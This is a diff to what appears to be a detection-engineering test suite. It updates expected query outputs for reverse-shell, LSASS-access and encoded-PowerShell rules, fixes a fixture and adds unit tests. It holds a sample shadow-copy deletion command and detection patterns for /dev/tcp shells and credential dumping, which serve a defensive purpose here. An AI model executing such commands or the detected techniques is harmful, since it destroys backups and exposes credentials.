+diff --git a/tests/events/proc_creation_shadow_copy_delete/positive/02-wmic.jsonl b/tests/events/proc_creation_shadow_copy_delete/positive/02-wmic.jsonl
+index 640581b..d7063cd 100644
+--- a/tests/events/proc_creation_shadow_copy_delete/positive/02-wmic.jsonl
++++ b/tests/events/proc_creation_shadow_copy_delete/positive/02-wmic.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "wmic-delete", "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic shadowcopy delete /nointeractive"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "wmic-delete", "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic shadowcopy delete /nointeractive"}
+diff --git a/tests/expected/esql/auditd_reverse_shell_dev_tcp.txt b/tests/expected/esql/auditd_reverse_shell_dev_tcp.txt
+index 23b1c4f..20c50f5 100644
+--- a/tests/expected/esql/auditd_reverse_shell_dev_tcp.txt
++++ b/tests/expected/esql/auditd_reverse_shell_dev_tcp.txt
+@@ -1 +1 @@
+-from * metadata _id, _index, _version | where type=="EXECVE" and (a1 like "*/dev/tcp/*" or a1 like "*/dev/udp/*" or a2 like "*/dev/tcp/*" or a2 like "*/dev/udp/*")
++from * metadata _id, _index, _version | where type=="EXECVE" and (a1 like "*/dev/tcp/*" or a1 like "*/dev/udp/*" or a2 like "*/dev/tcp/*" or a2 like "*/dev/udp/*" or a3 like "*/dev/tcp/*" or a3 like "*/dev/udp/*")
+diff --git a/tests/expected/esql/proc_access_lsass.txt b/tests/expected/esql/proc_access_lsass.txt
+index caa9664..adf00af 100644
+--- a/tests/expected/esql/proc_access_lsass.txt
++++ b/tests/expected/esql/proc_access_lsass.txt
+@@ -1 +1 @@
+-from * metadata _id, _index, _version | where ends_with(winlog.event_data.TargetImage, "\\lsass.exe") and (winlog.event_data.GrantedAccess in ("0x1010", "0x1410", "0x1438", "0x143a", "0x1fffff")) and not (ends_with(process.executable.caseless, "\\MsMpEng.exe") or ends_with(process.executable.caseless, "\\MsSense.exe"))
++from * metadata _id, _index, _version | where ends_with(winlog.event_data.TargetImage, "\\lsass.exe") and (winlog.event_data.GrantedAccess in ("0x1010", "0x1410", "0x1438", "0x143a", "0x1fffff")) and not (starts_with(process.executable.caseless, "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\") and ends_with(process.executable.caseless, "\\MsMpEng.exe") or process.executable.caseless=="C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe")
+diff --git a/tests/expected/esql/proc_creation_encoded_powershell.txt b/tests/expected/esql/proc_creation_encoded_powershell.txt
+index 1b74571..5b25137 100644
+--- a/tests/expected/esql/proc_creation_encoded_powershell.txt
++++ b/tests/expected/esql/proc_creation_encoded_powershell.txt
+@@ -1 +1 @@
+-from * metadata _id, _index, _version | where (ends_with(process.executable.caseless, "\\powershell.exe") or ends_with(process.executable.caseless, "\\pwsh.exe")) and (process.command_line like "* -e *" or process.command_line like "* -en *" or process.command_line like "* -enc *" or process.command_line like "* -enco *" or process.command_line like "* -encodedcommand *" or process.command_line like "* -ec *")
++from * metadata _id, _index, _version | where (ends_with(process.executable.caseless, "\\powershell.exe") or ends_with(process.executable.caseless, "\\pwsh.exe")) and (process.command_line like "* -e *" or process.command_line like "* -en *" or process.command_line like "* -enc *" or process.command_line like "* -enco*" or process.command_line like "* -ec *")
+diff --git a/tests/expected/kusto/proc_creation_encoded_powershell.txt b/tests/expected/kusto/proc_creation_encoded_powershell.txt
+index f8b75c3..92aaceb 100644
+--- a/tests/expected/kusto/proc_creation_encoded_powershell.txt
++++ b/tests/expected/kusto/proc_creation_encoded_powershell.txt
+@@ -1,2 +1,2 @@
+ DeviceProcessEvents
+-| where (FolderPath endswith "\\powershell.exe" or FolderPath endswith "\\pwsh.exe") and (ProcessCommandLine contains " -e " or ProcessCommandLine contains " -en " or ProcessCommandLine contains " -enc " or ProcessCommandLine contains " -enco " or ProcessCommandLine contains " -encodedcommand " or ProcessCommandLine contains " -ec ")
++| where (FolderPath endswith "\\powershell.exe" or FolderPath endswith "\\pwsh.exe") and (ProcessCommandLine contains " -e " or ProcessCommandLine contains " -en " or ProcessCommandLine contains " -enc " or ProcessCommandLine contains " -enco" or ProcessCommandLine contains " -ec ")
+diff --git a/tests/expected/lucene/auditd_reverse_shell_dev_tcp.txt b/tests/expected/lucene/auditd_reverse_shell_dev_tcp.txt
+index fb67927..ceacd12 100644
+--- a/tests/expected/lucene/auditd_reverse_shell_dev_tcp.txt
++++ b/tests/expected/lucene/auditd_reverse_shell_dev_tcp.txt
+@@ -1 +1 @@
+-type:EXECVE AND ((a1:(*\/dev\/tcp\/* OR *\/dev\/udp\/*)) OR (a2:(*\/dev\/tcp\/* OR *\/dev\/udp\/*)))
++type:EXECVE AND ((a1:(*\/dev\/tcp\/* OR *\/dev\/udp\/*)) OR (a2:(*\/dev\/tcp\/* OR *\/dev\/udp\/*)) OR (a3:(*\/dev\/tcp\/* OR *\/dev\/udp\/*)))
+diff --git a/tests/expected/lucene/proc_access_lsass.txt b/tests/expected/lucene/proc_access_lsass.txt
+index 6d197f9..316f24d 100644
+--- a/tests/expected/lucene/proc_access_lsass.txt
++++ b/tests/expected/lucene/proc_access_lsass.txt
+@@ -1 +1 @@
+-(winlog.event_data.TargetImage:*\\lsass.exe AND (winlog.event_data.GrantedAccess:(0x1010 OR 0x1410 OR 0x1438 OR 0x143a OR 0x1fffff))) AND (NOT (process.executable.caseless:(*\\MsMpEng.exe OR *\\MsSense.exe)))
++(winlog.event_data.TargetImage:*\\lsass.exe AND (winlog.event_data.GrantedAccess:(0x1010 OR 0x1410 OR 0x1438 OR 0x143a OR 0x1fffff))) AND (NOT ((process.executable.caseless:C\:\\ProgramData\\Microsoft\\Windows\ Defender\\Platform\\* AND process.executable.caseless:*\\MsMpEng.exe) OR process.executable.caseless:"C\:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe"))
+diff --git a/tests/expected/lucene/proc_creation_encoded_powershell.txt b/tests/expected/lucene/proc_creation_encoded_powershell.txt
+index 68d0230..3fb3685 100644
+--- a/tests/expected/lucene/proc_creation_encoded_powershell.txt
++++ b/tests/expected/lucene/proc_creation_encoded_powershell.txt
+@@ -1 +1 @@
+-(process.executable.caseless:(*\\powershell.exe OR *\\pwsh.exe)) AND (process.command_line:(*\ \-e\ * OR *\ \-en\ * OR *\ \-enc\ * OR *\ \-enco\ * OR *\ \-encodedcommand\ * OR *\ \-ec\ *))
++(process.executable.caseless:(*\\powershell.exe OR *\\pwsh.exe)) AND (process.command_line:(*\ \-e\ * OR *\ \-en\ * OR *\ \-enc\ * OR *\ \-enco* OR *\ \-ec\ *))
+diff --git a/tests/expected/splunk/auditd_reverse_shell_dev_tcp.txt b/tests/expected/splunk/auditd_reverse_shell_dev_tcp.txt
+index 88b01e5..5afb996 100644
+--- a/tests/expected/splunk/auditd_reverse_shell_dev_tcp.txt
++++ b/tests/expected/splunk/auditd_reverse_shell_dev_tcp.txt
+@@ -1 +1 @@
+-type="EXECVE" a1 IN ("*/dev/tcp/*", "*/dev/udp/*") OR a2 IN ("*/dev/tcp/*", "*/dev/udp/*")
++type="EXECVE" a1 IN ("*/dev/tcp/*", "*/dev/udp/*") OR a2 IN ("*/dev/tcp/*", "*/dev/udp/*") OR a3 IN ("*/dev/tcp/*", "*/dev/udp/*")
+diff --git a/tests/expected/splunk/proc_access_lsass.txt b/tests/expected/splunk/proc_access_lsass.txt
+index eae6bcf..c25ceeb 100644
+--- a/tests/expected/splunk/proc_access_lsass.txt
++++ b/tests/expected/splunk/proc_access_lsass.txt
+@@ -1 +1 @@
+-TargetImage="*\\lsass.exe" GrantedAccess IN ("0x1010", "0x1410", "0x1438", "0x143a", "0x1fffff") NOT (SourceImage IN ("*\\MsMpEng.exe", "*\\MsSense.exe"))
++TargetImage="*\\lsass.exe" GrantedAccess IN ("0x1010", "0x1410", "0x1438", "0x143a", "0x1fffff") NOT ((SourceImage="C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*" SourceImage="*\\MsMpEng.exe") OR SourceImage="C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe")
+diff --git a/tests/expected/splunk/proc_creation_encoded_powershell.txt b/tests/expected/splunk/proc_creation_encoded_powershell.txt
+index 95937fa..15b6301 100644
+--- a/tests/expected/splunk/proc_creation_encoded_powershell.txt
++++ b/tests/expected/splunk/proc_creation_encoded_powershell.txt
+@@ -1 +1 @@
+-Image IN ("*\\powershell.exe", "*\\pwsh.exe") CommandLine IN ("* -e *", "* -en *", "* -enc *", "* -enco *", "* -encodedcommand *", "* -ec *")
++Image IN ("*\\powershell.exe", "*\\pwsh.exe") CommandLine IN ("* -e *", "* -en *", "* -enc *", "* -enco*", "* -ec *")
+diff --git a/tests/unit/test_check_matches.py b/tests/unit/test_check_matches.py
+index 979dcbb..c4a2d9f 100644
+--- a/tests/unit/test_check_matches.py
++++ b/tests/unit/test_check_matches.py
+@@ -86,3 +86,14 @@ def test_stale_output_file_is_not_reused(tmp_path: Path):
+     exe = _fake_exe(tmp_path, "pass\n")
+     with pytest.raises(ZircoliteError, match="no output file"):
+         run_zircolite(exe, tmp_path / "r.yml", tmp_path / "e.jsonl", [], tmp_path)
++
++
++def test_matched_ids_counts_a_match_without_test_event_id():
++    """An alert that cannot be traced to a fixture event must not read as 'no matches' (a negative would pass)."""
++    results = [{"title": "r", "matches": [{"row_id": 1}]}]
++    assert matched_ids(results) == {"<unidentified match of r>"}
++
++
++def test_matched_ids_counts_a_correlation_alert_without_evidence():
++    results = [{"title": "c", "matches": [{"result_type": "correlation", "alert_id": "a1", "evidence": []}]}]
++    assert matched_ids(results) == {"<unidentified match of c>"}
+diff --git a/tests/unit/test_common.py b/tests/unit/test_common.py
+index 4afca73..bcd964d 100644
+--- a/tests/unit/test_common.py
++++ b/tests/unit/test_common.py
+@@ -104,3 +104,11 @@ def test_judge_correlation_positive_needs_one_alert(tmp_path: Path):
+     fx = _fx(tmp_path, "positive", ["a", "b", "c"])
+     assert judge("r", fx, {"a"}, correlation=True) == []
+     assert judge("r", fx, set(), correlation=True) == ["r: positive/positive.jsonl: no correlation alert"]
++
++
++def test_read_jsonl_rejects_control_characters(tmp_path: Path):
++    r"""A lost backslash (CORP\alice written as CORP<BEL>lice) must not slip into fixtures unnoticed."""
++    p = tmp_path / "bel.jsonl"
++    p.write_text(r'{"TestEventId": "a", "User": "CORP\u0007lice"}' + "\n", encoding="utf-8")
++    with pytest.raises(FixtureError, match=r":1: control character in field User"):
++        read_jsonl(p)
